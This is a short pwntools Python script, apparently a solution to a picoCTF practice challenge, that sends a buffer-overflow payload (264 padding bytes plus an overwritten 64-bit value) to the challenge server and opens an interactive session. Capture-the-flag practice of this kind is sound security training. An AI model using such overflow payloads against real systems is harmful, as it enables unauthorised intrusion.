from pwn import *

payload = b'A' * 264 + p64(0xdeadbeef)
connection = remote('mars.picoctf.net',31890)
connection.sendline(payload)
connection.interactive()



